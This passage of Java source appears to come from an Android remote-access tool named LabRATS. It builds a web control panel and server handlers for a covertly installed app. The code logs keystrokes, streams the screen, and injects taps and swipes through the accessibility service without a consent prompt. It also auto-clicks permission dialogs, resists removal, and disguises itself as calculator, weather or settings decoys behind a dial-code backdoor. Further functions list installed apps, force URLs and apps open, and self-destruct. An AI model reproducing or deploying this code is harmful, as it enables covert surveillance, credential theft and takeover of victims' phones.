        // Self Healing & Automation
        html.append("<div class=\"info-item\">");
        html.append("<div class=\"info-label\">SELF_HEALING_PROTOCOL</div>");
        html.append("<p style=\"color:#888; font-size:0.75rem; margin-top:5px; margin-bottom:10px;\">Forces open system permissions or automatically grants requested prompts.</p>");
        html.append("<div style=\"display:flex; flex-wrap:wrap; gap:10px;\">");
        html.append("<button onclick=\"ghostAction('autoheal')\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); margin:0;\">INITIATE_HEAL</button>");
        
        String autoPilotLabel = IO_Persistence_Manager.isAutoPilotEngaged() ? "AUTOPILOT_ENGAGED" : "AUTOPILOT_OFF";
        String autoPilotClass = IO_Persistence_Manager.isAutoPilotEngaged() ? "btn btn-small btn-engaged-yellow" : "btn btn-small";
        html.append("<button id=\"autopilot-btn\" onclick=\"toggleAutoPilot()\" class=\"").append(autoPilotClass).append("\" style=\"border-color: var(--neon-yellow); margin:0;\">").append(autoPilotLabel).append("</button>");

        html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"margin:0;\">LOADING...</button>");
        html.append("</div></div>");
        
        html.append("</div></div>");

        // Ghost Remote Control Section
        html.append("<div class=\"info-section\">");
        html.append("<h3 style=\"font-size: 0.95rem; display: flex; align-items: center; gap: 8px; justify-content: flex-start; text-align: left;\">&#128433; Ghost_Remote_Control</h3>");
        html.append("<p style=\"color: #888; font-size: 0.85rem; margin-bottom: 20px;\">Real-time interaction using Accessibility Triangulation (No consent prompt required).</p>");
        
        // Screen View tool
        html.append("<div style=\"text-align: center; margin-bottom: 25px;\">");
        html.append("<div class=\"phone-frame\">");
        html.append("<div class=\"phone-notch\"></div>");
        html.append("<div id=\"ghost-screen-container\" class=\"phone-screen\" style=\"cursor: crosshair;\">");
        html.append("<img id=\"ghost-screen-stream\" src=\"\" style=\"width: 100%; height: auto; display: block; user-select: none; -webkit-user-drag: none;\" onmousedown=\"startGhostDrag(event)\" onmouseup=\"endGhostDrag(event)\" />");
        html.append("<div id=\"ghost-screen-status\" style=\"color: #444; font-size: 0.7rem; font-weight: bold; letter-spacing: 2px; text-shadow: 0 0 10px rgba(0,242,255,0.3);\">OLED_STANDBY</div>");
        html.append("</div></div>");
        html.append("<div id=\"blackout-feedback\" style=\"display:none; font-size:0.6rem; color:var(--neon-cyan); margin-top:10px; font-family:monospace; letter-spacing:1px;\">&#9888; BLACKOUT_MODE_ACTIVE: FEED_NORMALIZED</div>");
        html.append("</div>");

        // System Gestures right below the screen
        html.append("<div style=\"display:flex; justify-content:center; gap:5px; margin-bottom:20px;\">");
        html.append("<button onclick=\"ghostAction('recents')\" class=\"btn btn-small\" style=\"margin:0; border-radius: 12px; border-color: #9b59b6; color: #9b59b6; flex:1; max-width:110px; padding: 10px 5px;\">RECENTS</button>");
        html.append("<button onclick=\"ghostAction('home')\" class=\"btn btn-small\" style=\"margin:0; border-radius: 12px; flex:1; max-width:110px; padding: 10px 5px;\">HOME</button>");
        html.append("<button onclick=\"ghostAction('back')\" class=\"btn btn-small\" style=\"margin:0; border-radius: 12px; border-color: #f39c12; color: #f39c12; flex:1; max-width:110px; padding: 10px 5px;\">BACK</button>");
        html.append("</div>");

        // Toggle Initiate/Terminate button
        html.append("<div style=\"display:flex; justify-content:center; margin-bottom:30px;\">");
        html.append("<button id=\"ghost-toggle-btn\" onclick=\"toggleGhostScreen()\" class=\"btn\" style=\"max-width:300px; border-radius:12px; margin: 0 auto;\">INITIATE_VIEW</button>");
        html.append("</div>");

        // Stealth Operations Section (Moved Down)
        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-orange);\">");
        html.append("<h2 style=\"color: var(--neon-orange); font-size: 0.95rem; text-align: left;\">STEALTH_OPERATIONS</h2>");
        html.append("<p style=\"color: #888; margin-bottom: 20px;\">Manage advanced app camouflage. Choose an identity from the library. Each identity includes a <b>fully functional decoy interface</b>. Use dial pad code <b>*#1337#</b> or find the hidden 10-tap backdoor to restore access.</p>");
        
        html.append("<div style=\"margin-bottom: 15px; display: flex; flex-direction: column; align-items: center;\">");
        html.append("<label class=\"info-label\" style=\"align-self: center;\">MASQUERADE_IDENTITY:</label>");
        html.append("<select id=\"stealth-type\" style=\"width:100%; max-width:450px; background:#000; border:1px solid var(--neon-orange); color:#fff; padding:10px; border-radius:8px; outline:none; font-family:monospace; margin-top:5px;\">");
        html.append("<option value=\"update\">System Update (Status Gear)</option>");
        html.append("<option value=\"calc\">Calculator (Apple Style)</option>");
        html.append("<option value=\"weather\">Weather (Blue Sky Forecast)</option>");
        html.append("<option value=\"settings\">Settings (System Config)</option>");
        html.append("</select>");
        html.append("</div>");

        html.append("<div class=\"btn-container\" style=\"display:flex; flex-direction:column; gap:10px; align-items: center;\">");
        html.append("<button onclick=\"toggleStealth()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05); border-radius:12px; padding: 10px 25px;\">INITIATE_STEALTH</button>");
        html.append("<button onclick=\"restoreNormal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); border-radius:12px; padding: 10px 25px;\">RESTORE_NORMAL</button>");
        html.append("</div>");
        html.append("</div>");

        // Ghost Keylogs Section (Renamed)
        html.append("<div id=\"keylogger-box\" class=\"card card-keylogger\" style=\"margin-top: 30px; display: block !important;\">");
        html.append("<div class=\"flex-header\">");
        html.append("<h2 style=\"color:var(--neon-cyan); margin:0; font-size: 0.85rem; display: flex; align-items: center; gap: 8px;\">&#9000; Ghost_Keylogs</h2>");
        html.append("<button onclick=\"clearGhostLogs()\" class=\"btn btn-small\" style=\"border-color:var(--danger); color:var(--danger); margin:0; border-radius: 12px;\">PURGE_LOGS</button>");
        html.append("</div>");
        html.append("<p style=\"color: #888; font-size: 0.8rem; margin-bottom:15px;\">Real-time interception of keystrokes and system text.</p>");
        
        html.append("<div id=\"ghost-terminal\" class=\"terminal-text\" style=\"height:300px; overflow-y:auto; white-space:pre-wrap; border:1px solid rgba(0, 242, 255, 0.1);\">");
        html.append("[WAITING_FOR_UPLINK] Monitoring focused app input...");
        html.append("</div>");
        html.append("</div>");
        
        html.append("<div style=\"height: 50px;\"></div>"); // Buffer

        html.append("<script>");
        html.append("var ghostScreenActive = false;");
        html.append("var ghostIsIdle = false;");
        html.append("function startGhostScreen() {");
        html.append("  ghostScreenActive = true;");
        html.append("  const status = document.getElementById('ghost-screen-status');");
        html.append("  if (status) status.style.display = 'none';");
        html.append("  const toggleBtn = document.getElementById('ghost-toggle-btn');");
        html.append("  if (toggleBtn) { toggleBtn.innerText = 'TERMINATE'; toggleBtn.style.borderColor = 'var(--danger)'; toggleBtn.style.color = 'var(--danger)'; }");
        html.append("  document.getElementById('ghost-screen-status').innerHTML = 'CONNECTING...';");
        html.append("  const startBtn = document.getElementById('ghost-start-btn'); if(startBtn) startBtn.style.display = 'none';");
        html.append("  const stopBtn = document.getElementById('ghost-stop-btn'); if(stopBtn) stopBtn.style.display = 'inline-block';");
        html.append("  refreshGhostScreen();");
        html.append("}");
        html.append("function stopGhostScreen() {");
        html.append("  ghostScreenActive = false;");
        html.append("  const status = document.getElementById('ghost-screen-status');");
        html.append("  if (status) { status.style.display = 'block'; status.innerText = 'OLED_STANDBY'; }");
        html.append("  const toggleBtn = document.getElementById('ghost-toggle-btn');");
        html.append("  if (toggleBtn) { toggleBtn.innerText = 'INITIATE_VIEW'; toggleBtn.style.borderColor = 'var(--neon-green)'; toggleBtn.style.color = 'var(--neon-green)'; }");
        html.append("  document.getElementById('ghost-screen-status').innerHTML = 'COVERT_FEED_STANDBY';");
        html.append("  document.getElementById('ghost-screen-status').style.display = 'block';");
        html.append("  document.getElementById('ghost-screen-stream').src = '';");
        html.append("  const startBtn = document.getElementById('ghost-start-btn'); if(startBtn) startBtn.style.display = 'inline-block';");
        html.append("  const stopBtn = document.getElementById('ghost-stop-btn'); if(stopBtn) stopBtn.style.display = 'none';");
        html.append("}");
        html.append("function toggleGhostScreen() {");
        html.append("  if (ghostScreenActive) stopGhostScreen(); else startGhostScreen();");
        html.append("}");
        html.append("function refreshGhostScreen() {");
        html.append("  if (!ghostScreenActive) return;");
        html.append("  const img = document.getElementById('ghost-screen-stream');");
        html.append("  const status = document.getElementById('ghost-screen-status');");
        
        // --- DOUBLE BUFFERING PROTOCOL ---
        // Create an off-screen buffer to load the next frame
        // This prevents the "flashing" or white flicker between frames.
        html.append("  const buffer = new Image();");
        html.append("  buffer.src = '/ghost/screenshot?t=' + Date.now();");
        
        html.append("  buffer.onload = () => {");
        html.append("    if (!ghostScreenActive) return;");
        html.append("    img.src = buffer.src;");
        html.append("    if (status) status.style.display = 'none';");
        html.append("    const nextRefresh = ghostIsIdle ? 5000 : 200;");
        html.append("    setTimeout(refreshGhostScreen, nextRefresh);");
        html.append("  };");
        
        html.append("  buffer.onerror = () => {");
        html.append("    if (ghostScreenActive) setTimeout(refreshGhostScreen, 300);");
        html.append("  };");
        html.append("}");
        html.append("var ghostDragStart = null;");
        html.append("var lastInteractionTime = 0;");
        
        html.append("function startGhostDrag(e) {");
        html.append("  const img = document.getElementById('ghost-screen-stream');");
        html.append("  const rect = img.getBoundingClientRect();");
        html.append("  ghostDragStart = {");
        html.append("    x: ((e.clientX - rect.left) / rect.width) * 100,");
        html.append("    y: ((e.clientY - rect.top) / rect.height) * 100,");
        html.append("    t: Date.now()");
        html.append("  };");
        html.append("}");
        
        html.append("function endGhostDrag(e) {");
        html.append("  if (!ghostDragStart) return;");
        html.append("  const now = Date.now();");
        html.append("  if (now - lastInteractionTime < 150) return;");
        html.append("  lastInteractionTime = now;");

        html.append("  const img = document.getElementById('ghost-screen-stream');");
        html.append("  const rect = img.getBoundingClientRect();");
        html.append("  const endX = ((e.clientX - rect.left) / rect.width) * 100;");
        html.append("  const endY = ((e.clientY - rect.top) / rect.height) * 100;");
        html.append("  const duration = now - ghostDragStart.t;");
        html.append("  const dist = Math.sqrt(Math.pow(endX - ghostDragStart.x, 2) + Math.pow(endY - ghostDragStart.y, 2));");
        html.append("  if (dist < 2) {");
        html.append("    fetch('/ghost/interact?action=click&px=' + ghostDragStart.x + '&py=' + ghostDragStart.y);");
        html.append("  } else {");
        html.append("    fetch('/ghost/interact?action=swipe&px1=' + ghostDragStart.x + '&py1=' + ghostDragStart.y + '&px2=' + endX + '&py2=' + endY + '&d=' + Math.max(duration, 100));");
        html.append("  }");
        html.append("  ghostDragStart = null;");
        html.append("}");
        html.append("function openSettings() { fetch('/ghost/interact?action=settings'); }");
        html.append("function toggleLock() { if(confirm('Initiate System Lock? This will block the device display.')) fetch('/ghost/lock').then(() => checkGhostStatus()); }");
        html.append("function toggleBlackout() { fetch('/ghost/interact?action=' + (document.getElementById('blackout-btn').innerText.includes('ACTIVATE') ? 'blackout_on' : 'blackout_off')).then(() => checkGhostStatus()); }");
        html.append("function toggleStealth() {");
        html.append("  const type = document.getElementById('stealth-type').value;");
        html.append("  if(confirm('Initiate Stealth Protocol? This will change the app identity.')) {");
        html.append("    fetch('/stealth?type=' + type).then(r => r.json()).then(d => {");
        html.append("    });");
        html.append("  }");
        html.append("}");
        html.append("function restoreNormal() {");
        html.append("  if(confirm('Restore normal identity? This will re-enable the main System icon.')) {");
        html.append("    fetch('/stealth?action=restore').then(r => r.json()).then(d => {");
        html.append("    });");
        html.append("  }");
        html.append("}");
        html.append("function toggleAutoPilot() {");
        html.append("  fetch('/stealth?action=autopilot').then(r => r.json()).then(d => {");
        html.append("    const btn = document.getElementById('autopilot-btn');");
        html.append("    if(d.autopilot) {");
        html.append("      btn.innerText = 'AUTOPILOT_ENGAGED';");
        html.append("      btn.classList.add('btn-engaged-yellow');");
        html.append("      btn.style.color = '#000';"); // Force black text
        html.append("      btn.style.background = '#ffff00';"); // Force yellow background
        html.append("    } else {");
        html.append("      btn.innerText = 'AUTOPILOT_OFF';");
        html.append("      btn.classList.remove('btn-engaged-yellow');");
        html.append("      btn.style.color = 'var(--neon-yellow)';");
        html.append("      btn.style.background = 'rgba(255, 255, 255, 0.03)';");
        html.append("    }");
        html.append("  });");
        html.append("}");
        html.append("function ghostAction(a) { fetch('/ghost/interact?action='+a); }");
        html.append("function deployOverlay() {");
        html.append("  const type = document.getElementById('overlay-type').value;");
        html.append("  if(!type) return showToast('SELECT_TARGET_FIRST', 'error');");
        html.append("  if(confirm('Deploy Tactical Shadow Overlay?')) {");
        html.append("    fetch('/ghost/deploy-overlay?type=' + type).then(r => r.json()).then(d => {");
        html.append("      showToast('OVERLAY_DEPLOYED');");
        html.append("    });");
        html.append("  }");
        html.append("}");
        html.append("function clearGhostLogs() { if(confirm('Purge captured keystrokes?')) fetch('/ghost/clear').then(() => refreshGhostLogs()); }");
        html.append("async function refreshGhostLogs() {");
        html.append("  try {");
        html.append("    const r = await fetch('/ghost/keys');");
        html.append("    if (!r.ok) return;");
        html.append("    const data = await r.json();");
        html.append("    const term = document.getElementById('ghost-terminal');");
        html.append("    if(!term) return;");
        html.append("    if(data.keys.length > 0) {");
        html.append("      const isAtBottom = (term.scrollHeight - term.scrollTop) <= (term.clientHeight + 10);");
        html.append("      let esc = data.keys.join('').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');");
        html.append("      const _k = (s) => s.split('').map((c,i) => String.fromCharCode(c.charCodeAt(0) ^ 'SysAdmin'.charCodeAt(i % 8))).join('');");
        html.append("      const targets = [_k('\\x1C\\x0D\\x03'), _k('\\x13\\x18\\x00\\x12\\x13\\x01\\x10\\x0A'), _k('\\x0F\\x06\\x14\\x00\\x0A'), _k('\\x16\\x1A\\x16\\x13'), _k('\\x06\\x04\\x02\\x08\\x08')];");
        html.append("      targets.forEach(t => {");
        html.append("        const reg = new RegExp('(' + t + ')', 'gi');");
        html.append("        esc = esc.replace(reg, '<span style=\"color:var(--danger); font-weight:bold; text-shadow: 0 0 5px rgba(255,49,49,0.5);\">$1</span>');");
        html.append("      });");
        html.append("      term.innerHTML = esc;");
        html.append("      if (isAtBottom) { term.scrollTop = term.scrollHeight; }");
        html.append("    }");
        html.append("  } catch(e) {}");
        html.append("}");
        html.append("async function checkGhostStatus() {");
        html.append("  try {");
        html.append("    const r = await fetch('/ghost/status');");
        html.append("    if (!r.ok) return;");
        html.append("    const data = await r.json();");
        html.append("    ghostIsIdle = data.isIdle;");
        html.append("    const card = document.getElementById('ghost-status-card');");
        html.append("    const text = document.getElementById('ghost-status-text');");
        html.append("    const prompt = document.getElementById('accessibility-prompt');");
        html.append("    const lockBtn = document.getElementById('lock-btn');");
        html.append("    const arBtn = document.getElementById('anti-removal-btn');");
        html.append("    const blackoutBtn = document.getElementById('blackout-btn');");
        html.append("    if (data.active) {");
        html.append("      card.style.borderColor = 'var(--neon-green)';");
        html.append("      text.innerHTML = '<span style=\"color:var(--neon-green);\">UPLINK_ESTABLISHED</span>';");
        html.append("      prompt.style.display = 'none';");
        html.append("    } else {");
        html.append("      card.style.borderColor = 'var(--danger)';");
        html.append("      text.innerHTML = '<span style=\"color:var(--danger);\">OFFLINE_AWAITING_PERMISSION</span>';");
        html.append("      prompt.style.display = 'block';");
        html.append("    }");
        html.append("    if (lockBtn) {");
        html.append("      if (data.lock) {");
        html.append("        lockBtn.innerHTML = 'RELEASE_LOCK'; lockBtn.style.borderColor = 'var(--neon-green)'; lockBtn.style.color = 'var(--neon-green)';");
        html.append("      } else {");
        html.append("        lockBtn.innerHTML = 'DEPLOY_LOCK'; lockBtn.style.borderColor = 'var(--danger)'; lockBtn.style.color = 'var(--danger)';");
        html.append("      }");
        html.append("    }");
        html.append("    if (blackoutBtn) {");
        html.append("      if (data.blackout) {");
        html.append("        blackoutBtn.innerHTML = 'RESTORE_DISPLAY'; blackoutBtn.style.borderColor = 'var(--neon-cyan)'; blackoutBtn.style.color = 'var(--neon-cyan)';");
        html.append("      } else {");
        html.append("        blackoutBtn.innerHTML = 'ACTIVATE_BLACKOUT'; blackoutBtn.style.borderColor = '#fff'; blackoutBtn.style.color = '#fff';");
        html.append("      }");
        html.append("    }");
        html.append("    const stream = document.getElementById('ghost-screen-stream');");
        html.append("    if (stream) {");
        html.append("      if (data.blackout) {");
        html.append("        stream.style.filter = 'brightness(5) contrast(1.8) saturate(1.2) grayscale(0.2)';");
        html.append("      } else {");
        html.append("        stream.style.filter = 'none';");
        html.append("      }");
        html.append("    }");
        html.append("    if (arBtn) {");
        html.append("      if (data.antiRemoval) {");
        html.append("        arBtn.innerHTML = 'ANTI-REMOVAL SHIELD: ON'; arBtn.style.borderColor = 'var(--neon-green)'; arBtn.style.color = 'var(--neon-green)';");
        html.append("      } else {");
        html.append("        arBtn.innerHTML = 'ANTI-REMOVAL SHIELD: OFF'; arBtn.style.borderColor = 'var(--danger)'; arBtn.style.color = 'var(--danger)';");
        html.append("      }");
        html.append("    }");
        html.append("  } catch(e) {}");
        html.append("}");
        html.append("setInterval(checkGhostStatus, 2000);");
        html.append("setInterval(refreshGhostLogs, 2000);");
        html.append("</script>");

        html.append("</div>");
        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveKeystrokes() {
        org.json.JSONArray array = new org.json.JSONArray();
        for (String key : IO_Persistence_Manager.getKeystrokes()) {
            array.put(key);
        }
        try {
            org.json.JSONObject obj = new org.json.JSONObject();
            obj.put("keys", array);
            return newFixedLengthResponse(Response.Status.OK, "application/json", obj.toString());
        } catch (Exception e) { return serveError(e.getMessage()); }
    }

    private Response performInteraction(Map<String, String> params) {
        String action = params.get("action");
        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
        
        if (action == null) return serveError("No action");

        if (action.equals("settings")) {
            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    Intent settingsIntent = getSettingsIntent();
                    if (settingsIntent != null) {
                        context.startActivity(settingsIntent);
                    }
                } catch (Exception e) {
                    Log.e("LabRATS", "Settings intent error: " + e.getMessage());
                    // Fallback to basic settings
                    try {
                        Intent fallback = new Intent(android.provider.Settings.ACTION_SETTINGS);
                        fallback.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(fallback);
                    } catch (Exception ignored) {}
                }
            });
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true}");
        }

        if (ghost == null) return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false, \"error\":\"Ghost Service Offline\"}");

        // --- SECURITY LOCK CHECK ---
        if (IO_Persistence_Manager.isLockActive() && !action.equals("lock") && !action.equals("settings")) {
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false, \"error\":\"SYSTEM_LOCK_ACTIVE\"}");
        }

        boolean success = false;
        switch (action) {
            case "click":
                if (params.containsKey("px") && params.containsKey("py")) {
                    float px = Float.parseFloat(params.get("px"));
                    float py = Float.parseFloat(params.get("py"));
                    int realX = (int) (px * ghost.getScreenWidth() / 100);
                    int realY = (int) (py * ghost.getScreenHeight() / 100);
                    success = ghost.clickAt(realX, realY);
                } else if (params.containsKey("x") && params.containsKey("y")) {
                    int x = Integer.parseInt(params.get("x"));
                    int y = Integer.parseInt(params.get("y"));
                    success = ghost.clickAt(x, y);
                } else if (params.containsKey("text")) {
                    success = ghost.clickByText(params.get("text"));
                }
                break;
            case "clickText":
                if (params.containsKey("text")) {
                    success = ghost.clickByText(params.get("text"));
                }
                break;
            case "clickId":
                if (params.containsKey("id")) {
                    success = ghost.clickById(params.get("id"));
                }
                break;
            case "swipe":
                if (params.containsKey("px1") && params.containsKey("py1") && params.containsKey("px2") && params.containsKey("py2")) {
                    float px1 = Float.parseFloat(params.get("px1"));
                    float py1 = Float.parseFloat(params.get("py1"));
                    float px2 = Float.parseFloat(params.get("px2"));
                    float py2 = Float.parseFloat(params.get("py2"));
                    int d = Integer.parseInt(params.get("d"));
                    int x1 = (int) (px1 * ghost.getScreenWidth() / 100);
                    int y1 = (int) (py1 * ghost.getScreenHeight() / 100);
                    int x2 = (int) (px2 * ghost.getScreenWidth() / 100);
                    int y2 = (int) (py2 * ghost.getScreenHeight() / 100);
                    success = ghost.swipe(x1, y1, x2, y2, d);
                }
                break;
            case "home":
                success = ghost.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                break;
            case "back":
                success = ghost.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                break;
            case "recents":
                    success = ghost.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                break;
            case "blackout_on":
                ghost.startBlackout(true);
                success = true;
                break;
            case "blackout_off":
                ghost.startBlackout(false);
                success = true;
                break;
            case "autoheal":
                ghost.runAutoHeal();
                success = true;
                break;
            case "toggleAntiRemoval":
                IO_Persistence_Manager.setAntiRemovalEnabled(!IO_Persistence_Manager.isAntiRemovalEnabled());
                success = true;
                break;
            case "autogrant":
                success = ghost.clickByText("Allow") || 
                          ghost.clickByText("While using the app") || 
                          ghost.clickByText("Only this time") || 
                          ghost.clickByText("Allow all the time") ||
                          ghost.clickByText("GRANT") ||
                          ghost.clickByText("ALLOW");
                break;
        }

        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":" + success + "}");
    }

    @NonNull
    private Intent getSettingsIntent() {
        android.content.ComponentName componentName = new android.content.ComponentName(context, IO_Persistence_Manager.class);
        String serviceId = componentName.flattenToString();
        
        // Use standard accessibility settings intent to avoid permission denials
        Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_CLEAR_TOP);

        // Fallback-style extras that work on some OEM versions to help navigation
        intent.putExtra(":settings:fragment_args_key", serviceId);
        android.os.Bundle bundle = new android.os.Bundle();
        bundle.putString(":settings:fragment_args_key", serviceId);
        intent.putExtra(":settings:show_fragment_args", bundle);

        return intent;
    }

    private void vibrateDevice() {
        android.os.Vibrator v = (android.os.Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
        if (v != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                v.vibrate(android.os.VibrationEffect.createOneShot(500, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                v.vibrate(500);
            }
            logActivity("DEVICE_CONTROL: Triggered vibration sequence");
        }
    }

    private void setMaxVolume() {
        android.media.AudioManager am = (android.media.AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        if (am != null) {
            int[] streams = {android.media.AudioManager.STREAM_RING, android.media.AudioManager.STREAM_MUSIC, 
                             android.media.AudioManager.STREAM_NOTIFICATION, android.media.AudioManager.STREAM_ALARM};
            for (int stream : streams) {
                am.setStreamVolume(stream, am.getStreamMaxVolume(stream), 0);
            }
            logActivity("DEVICE_CONTROL: System volume synchronized to MAXIMUM");
        }
    }

    private void setSilentMode() {
        android.media.AudioManager am = (android.media.AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        if (am != null) {
            am.setRingerMode(android.media.AudioManager.RINGER_MODE_SILENT);
            logActivity("DEVICE_CONTROL: System entered SILENT mode");
        }
    }

    private void openUrlOnDevice(String url) {
        if (url == null || url.isEmpty()) return;
        try {
            if (!url.startsWith("http")) url = "http://" + url;
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setData(Uri.parse(url));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(i);
            logActivity("DEVICE_CONTROL: Forced open URL - " + url);
        } catch (Exception e) {
            logActivity("DEVICE_ERROR: Failed to open URL - " + e.getMessage());
        }
    }

    private void openAppOnDevice(String packageName) {
        if (packageName == null || packageName.isEmpty()) return;
        try {
            Intent i = context.getPackageManager().getLaunchIntentForPackage(packageName);
            if (i != null) {
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(i);
                logActivity("DEVICE_CONTROL: Forced open App - " + packageName);
            } else {
                logActivity("DEVICE_ERROR: No launch intent for " + packageName);
            }
        } catch (Exception e) {
            logActivity("DEVICE_ERROR: Failed to open app - " + e.getMessage());
        }
    }

    private void showToast(String msg) {
        if (msg == null || msg.isEmpty()) return;
        new Handler(Looper.getMainLooper()).post(() -> {
            IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
            if (ghost != null) {
                ghost.showOverlayToast(msg);
                logActivity("DEVICE_CONTROL: Overlay toast dispatched via Ghost - " + msg);
            } else {
                // Fallback to standard toast if Accessibility is not enabled
                android.widget.Toast.makeText(context, msg, android.widget.Toast.LENGTH_LONG).show();
                logActivity("DEVICE_CONTROL: System toast dispatched (Standard) - " + msg);
            }
        });
    }

    private Response serveAppList(IHTTPSession session) {
        logActivity("SYSTEM_EXTRACT: Package manager database retrieved");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"text-align: left; margin-bottom: 20px;\">Installed Applications</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
        
        android.content.pm.PackageManager pm = context.getPackageManager();
        List<android.content.pm.PackageInfo> apps = pm.getInstalledPackages(0);
        
        html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Icon</th><th>App Name</th><th>Package ID</th><th>Type</th><th>Version</th></tr></thead><tbody>");
        for (android.content.pm.PackageInfo app : apps) {
            String name = app.applicationInfo.loadLabel(pm).toString();
            boolean isSystem = (app.applicationInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
            String typeLabel = isSystem ? "<span style=\"color:#888; font-size:0.6rem;\">SYSTEM</span>" : "<span style=\"color:var(--neon-green); font-size:0.6rem; font-weight:bold;\">USER</span>";
            String iconBase64 = getAppIconBase64(app.applicationInfo);
            String iconImg = iconBase64.isEmpty() ? "<div style='width:24px;height:24px;background:#333;border-radius:4px;'></div>" : 
                "<img src='data:image/png;base64," + iconBase64 + "' style='width:24px;height:24px;border-radius:4px;'>";

            html.append("<tr><td style='width:30px;'>").append(iconImg).append("</td>");
            html.append("<td>").append(escapeHtml(name)).append("</td>");
            html.append("<td style=\"font-family:monospace; font-size:0.7rem;\">").append(app.packageName).append("</td>");
            html.append("<td>").append(typeLabel).append("</td>");
            html.append("<td>").append(app.versionName).append("</td></tr>");
        }
        html.append("</tbody></table></div></div>").append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private String getAppIconBase64(android.content.pm.ApplicationInfo appInfo) {
        try {
            android.content.pm.PackageManager pm = context.getPackageManager();
            android.graphics.drawable.Drawable drawable = appInfo.loadIcon(pm);
            android.graphics.Bitmap bitmap;
            if (drawable instanceof android.graphics.drawable.BitmapDrawable) {
                bitmap = ((android.graphics.drawable.BitmapDrawable) drawable).getBitmap();
            } else {
                int w = Math.max(1, drawable.getIntrinsicWidth());
                int h = Math.max(1, drawable.getIntrinsicHeight());
                bitmap = android.graphics.Bitmap.createBitmap(w, h, android.graphics.Bitmap.Config.ARGB_8888);
                android.graphics.Canvas canvas = new android.graphics.Canvas(bitmap);
                drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
                drawable.draw(canvas);
            }
            android.graphics.Bitmap scaled = android.graphics.Bitmap.createScaledBitmap(bitmap, 48, 48, true);
            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
            scaled.compress(android.graphics.Bitmap.CompressFormat.PNG, 90, out);
            return android.util.Base64.encodeToString(out.toByteArray(), android.util.Base64.NO_WRAP);
        } catch (Exception e) {
            return "";
        }
    }

    private void selfDestruct() {
        Log.d("SelfDestruct", "SUICIDE_INIT: Hard Persistent Trigger");
        
        // 1. SET PERSISTENT FLAG FIRST - Everything checks this now
        context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .edit().putBoolean("is_destructing", true).commit(); // commit() for immediate disk write
        
        WorkManager_Sync.isDestructing = true;
        IO_Persistence_Manager.forceSkipAntiRemoval();
        
        // 1. Kill the server and communication uplink immediately
        new Thread(() -> {
            try {
                Thread.sleep(300);
                FirebaseConfig.this.stop();
            } catch (Exception ignored) {}
        }).start();

        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                String pkg = context.getPackageName();
                android.content.pm.PackageManager pm = context.getPackageManager();
                String pkgName = context.getPackageName();

                // 2. DISABLE ALL DECOYS IMMEDIATELY (Force single icon)
                String[] decoys = {
                    "com.labs.labrats.SystemUpdateAlias",
                    "com.labs.labrats.CalculatorAlias",
                    "com.labs.labrats.WeatherAlias",
                    "com.labs.labrats.SettingsAlias"
                };
                for (String decoy : decoys) {
                    try {
                        pm.setComponentEnabledSetting(new android.content.ComponentName(context, decoy),
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            0); 
                    } catch (Exception ignored) {}
                }

                // 3. RE-ENABLE MAIN LAUNCHER AND ACTIVITY
                pm.setComponentEnabledSetting(new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias"),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        0);
                
                pm.setComponentEnabledSetting(new android.content.ComponentName(context, "com.labs.labrats.MainActivity"),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        0);

                // 4. Wipe all local data except the destruct flag
                context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE).edit().clear().apply();

                // 5. INITIATE PERSISTENT UNINSTALL LOOP
                SystemAnalytics.triggerSelfDestructLoop(context);

                // 6. Hard Kill self after 45 seconds
